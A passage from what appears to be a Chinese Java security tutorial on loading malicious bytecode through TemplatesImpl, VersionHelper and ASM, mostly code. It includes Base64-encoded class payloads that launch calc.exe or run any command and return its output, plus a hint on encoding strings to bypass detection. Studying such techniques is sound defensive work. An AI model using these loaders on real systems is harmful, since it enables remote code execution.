class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTGNvbS9DYWxjOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHACYBAApTb3VyY2VGaWxlAQAJQ2FsYy5qYXZhDAAZABoHACcMACgAKQEACGNhbGMuZXhlDAAqACsBAAhjb20vQ2FsYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABAAEQACABIAAAAEAAEAEwABAAcAFAACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFAALAAAAKgAEAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABUAFgACAAAAAQAXABgAAwASAAAABAABABMAAQAZABoAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAWAAQAFwANABgACwAAAAwAAQAAAA4ADAANAAAAEgAAAAQAAQAbAAEAHAAAAAIAHQ==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] byteCode = Base64.getDecoder().decode(code);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// _bytecodes 是由字节码组成的数组</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(obj, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// _name 可以是任意字符串，只要不为 null 即可</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(obj, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 固定写法</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(obj, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        obj.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>TemplatesImpl</code> 中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p><p>于是我们可以编写这样一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="shiro中的利用"><a href="#shiro中的利用" class="headerlink" title="shiro中的利用"></a>shiro中的利用</h3><p>具体可以看p师傅的《Java安全漫谈 - 15.TemplatesImpl在Shiro 中的利用》</p><p>其中<code>TemplatesImpl</code>的初始化可以简化为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;...bytescode&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure><h2 id="0x06-VersionHelper"><a href="#0x06-VersionHelper" class="headerlink" title="0x06 VersionHelper"></a>0x06 VersionHelper</h2><p>直接写到临时文件下，然后进行加载</p><p>注：恶意类不要其他的包名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.VersionHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.naming.internal.VersionHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Version_Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarPath</span> <span class="operator">=</span> tmp + File.separator + <span class="string">&quot;ByteCodeEvil.class&quot;</span>;</span><br><span class="line">        Files.write(Paths.get(jarPath), Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQARQoAEQAjBwAkCgACACMHACUHACYKACcAKAoAJwApCgAqACsKAAUALAoABAAtCgAEAC4KAAIALwgAMAoAAgAxCQAQADIHADMHADQBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAMwcANQcAJAcAJQEACkV4Y2VwdGlvbnMHADYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUADcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwA4DAA5ADoMADsAPAcAPQwAPgA/DAAUAEAMABQAQQwAQgAgDABDAEQBAAEKDAAfACAMABIAEwEADEJ5dGVDb2RlRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAACYAAYABQAAAEcqtwABuwACWbcAA027AARZuwAFWbgABiu2AAe2AAi3AAm3AApOLbYAC1k6BMYAEiwZBLYADBINtgAMV6f/6iostgAOtQAPsQAAAAIAFwAAAB4ABwAAAAcABAAIAAwACQAlAAsALwAMAD4ADgBGAA8AGAAAABsAAv8AJQAEBwAZBwAaBwAbBwAcAAD8ABgHABoAHQAAAAQAAQAeAAEAHwAgAAEAFgAAAB0AAQABAAAABSq0AA+wAAAAAQAXAAAABgABAAAAEwABACEAAAACACI=&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">VersionHelper</span> <span class="variable">helper</span> <span class="operator">=</span> VersionHelper.getVersionHelper();</span><br><span class="line">        Class&lt;?&gt; clazz = helper.loadClass(<span class="string">&quot;ByteCodeEvil&quot;</span>, <span class="string">&quot;file:&quot;</span> + tmp + File.separator);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x07-ASM加载"><a href="#0x07-ASM加载" class="headerlink" title="0x07 ASM加载"></a>0x07 ASM加载</h2><p>需要手动操纵字节码的需求，可以使用ASM，它可以直接生产 .class字节码文件，也可以在类被加载入JVM之前动态修改类行为）</p><p>相关原理如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220313175434.png"></p><blockquote><p>ASM是Java操纵类字节码的工具，ASM提供两类API，能够分别将类表示为事件和对象。我们先主要了解核心API，即能够将类以事件方式操纵的方式，即用<strong>基于事件的模型</strong>。</p></blockquote><blockquote><p>在采用基于事件的模型时，类是用一系列事件来表示的，每个事件表示类的一个元素，比 如 它的一个标头、一个字段、一个方法声明、一条指令，等等。基于事件的 API 定义了一组 可能 事件，以及这些事件必须遵循的发生顺序，还提供了一个类分析器，为每个被分析元素生 成一个 事件，还提供一个类写入器，由这些事件的序列生成经过编译的类。</p></blockquote><p>下面介绍一下常用API的使用</p><h3 id="ClassVistor"><a href="#ClassVistor" class="headerlink" title="ClassVistor"></a>ClassVistor</h3><p>ClassVistor用于访问class，本身是抽象类。<strong>定义在读取Class字节码时会触发的事件。</strong>只要将所需执行的操作写入对应方法下，调用ClassVistor的其他类就能在对应的条件下触发他们。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassVisitor</span><span class="params">(<span class="type">int</span> api, ClassVisitor cv)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitSource</span><span class="params">(String source, String debug)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span>; </span><br><span class="line">AnnotationVisitor <span class="title function_">visitAnnotation</span><span class="params">(String desc, <span class="type">boolean</span> visible)</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitAttribute</span><span class="params">(Attribute attr)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="type">int</span> access)</span>;</span><br><span class="line"><span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span>;</span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name,String desc,String signature, String[] exceptions)</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简要说明一下下文用到的方法参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>version为编辑的类的java版本，例如V1_8;</p></li><li><p>access为访问标识，即该类的修饰，如ACC_PUBLIC. 若一个类具有多个修饰符，将Opcode码相加即可;</p></li><li><p>name为类的内部名；</p></li><li><p>signature为签名，可为null；</p></li><li><p>superName描述它的超类，即extends的类，填写内部名；</p></li><li><p>superName描述它的接口，即implements的类，填写内部名；</p></li></ul><p>注：<strong>ClassWriter继承了ClassVisitor</strong>。</p><p>其中，还是用的到了如下函数</p><p>methodVisitor .visitXXXInsn()来填充函数，添加方法实现的字节码</p><ul><li>visitVarInsn(int opcode, int var) ：带有参数的字节码指令</li><li>visitInsn(int opcode) ： 无参数的字节码指令</li><li>visitLdcInsn(Object cst): LDC专用指令。LDC_W，LDC2_W已被废弃</li><li>visitTypeInsn(int opcode, String type) ：带有引用类型参数的字节码指令</li><li>visitMethodInsn(int opcode, String owner, String name,String desc)：调用方法</li><li>visitFieldInsn(int opcode, String owner, String name, String desc)：操作变量</li></ul><p>字节码指令如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: iload_1</span><br><span class="line"><span class="number">1</span>: iflt          <span class="number">12</span>     ###如果栈顶值&lt;=<span class="number">0</span>，则跳转至label标记指定的指令，否则顺序执行</span><br><span class="line"><span class="number">4</span>: aload_0</span><br><span class="line"><span class="number">5</span>: iload_1</span><br><span class="line"><span class="number">6</span>: putfield      #<span class="number">2</span>     <span class="comment">// Field f:I</span></span><br><span class="line"><span class="number">9</span>: goto          <span class="number">20</span>     ####无条件跳转</span><br><span class="line">###创建一个异常对象，并压入栈顶。</span><br><span class="line"><span class="number">12</span>: <span class="keyword">new</span>          #<span class="number">3</span>     <span class="comment">// class java/lang/IllegalArgumentException</span></span><br><span class="line"><span class="number">15</span>: dup                 ####栈顶值再入栈一次，此时栈顶前<span class="number">2</span>位都是同一个值</span><br><span class="line">###invokespecial 弹出栈顶元素，调用其构造函数，此时栈顶值仍然是异常对象</span><br><span class="line"><span class="number">16</span>: invokespecial #<span class="number">4</span>    <span class="comment">// Method java/lang/IllegalArgumentException.&quot;&lt;init&gt;&quot;:()V  </span></span><br><span class="line"><span class="number">19</span>: athrow    ###弹出剩下的异常的副本，</span><br><span class="line"><span class="number">20</span>: <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>最后我们的demo可以为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASM_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, IOException &#123;</span><br><span class="line">        <span class="comment">// 注意导入开头为jdk.internal</span></span><br><span class="line">        <span class="comment">// 注意flag为COMPUTE_FRAMES否则报错</span></span><br><span class="line">        jdk.internal.org.objectweb.asm.<span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">jdk</span>.internal.org.objectweb.asm.ClassWriter(</span><br><span class="line">                jdk.internal.org.objectweb.asm.ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">        <span class="comment">// 类属性visitor</span></span><br><span class="line">        jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor;</span><br><span class="line">        <span class="comment">// 类方法visitor</span></span><br><span class="line">        jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor;</span><br><span class="line">        <span class="comment">// 类名可以自行修改</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, <span class="string">&quot;com/ByteCodeEvil&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        fieldVisitor = classWriter.visitField(<span class="number">0</span>, <span class="string">&quot;res&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        fieldVisitor.visitEnd();</span><br><span class="line">        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java/io/IOException&quot;</span>&#125;);</span><br><span class="line">        methodVisitor.visitCode();</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW, <span class="string">&quot;java/lang/StringBuilder&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ASTORE, <span class="number">2</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW, <span class="string">&quot;java/io/BufferedReader&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW, <span class="string">&quot;java/io/InputStreamReader&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        <span class="comment">// 这里可以针对字符串做拆分编码等操作来Bypass</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESTATIC, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;getRuntime&quot;</span>, <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">1</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Process;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/Process&quot;</span>, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/io/InputStreamReader&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/InputStream;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/io/BufferedReader&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/Reader;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ASTORE, <span class="number">3</span>);</span><br><span class="line">        jdk.internal.org.objectweb.asm.<span class="type">Label</span> <span class="variable">label0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">jdk</span>.internal.org.objectweb.asm.Label();</span><br><span class="line">        methodVisitor.visitLabel(label0);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">3</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/BufferedReader&quot;</span>, <span class="string">&quot;readLine&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        methodVisitor.visitVarInsn(ASTORE, <span class="number">4</span>);</span><br><span class="line">        jdk.internal.org.objectweb.asm.<span class="type">Label</span> <span class="variable">label1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">jdk</span>.internal.org.objectweb.asm.Label();</span><br><span class="line">        methodVisitor.visitJumpInsn(IFNULL, 